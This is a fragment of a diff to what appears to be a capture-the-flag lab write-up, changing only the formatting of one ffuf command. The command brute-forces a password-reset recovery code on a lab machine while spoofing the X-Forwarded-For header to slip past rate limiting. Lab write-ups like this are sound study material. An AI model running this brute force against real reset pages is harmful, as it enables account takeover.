@@ -171,9 +171,7 @@ for thread in threads:
 </br> 
 </br>  using ffuf, we must randomize X-Forwarded-For or else get blocked by rate limit
 </br> (also, new ip address because over 2 hrs used, new machine needed launching)
-```
-ffuf -u http://10.10.204.172:1337/reset_password.php -w codes.txt -X "POST" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: FUZZ" -H "Cookie: PHPSESSID=1lnhe4l8k1vnphbgiqtu51u3ef" -d "recovery_code=FUZZ" -fr "Invalid"
-```
+</br> `ffuf -u http://10.10.204.172:1337/reset_password.php -w codes.txt -X "POST" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: FUZZ" -H "Cookie: PHPSESSID=1lnhe4l8k1vnphbgiqtu51u3ef" -d "recovery_code=FUZZ" -fr "Invalid"`
 </br> 
 </br> note: the process is tricky 
 </br> 1) set the http:// to whatever your target ip is
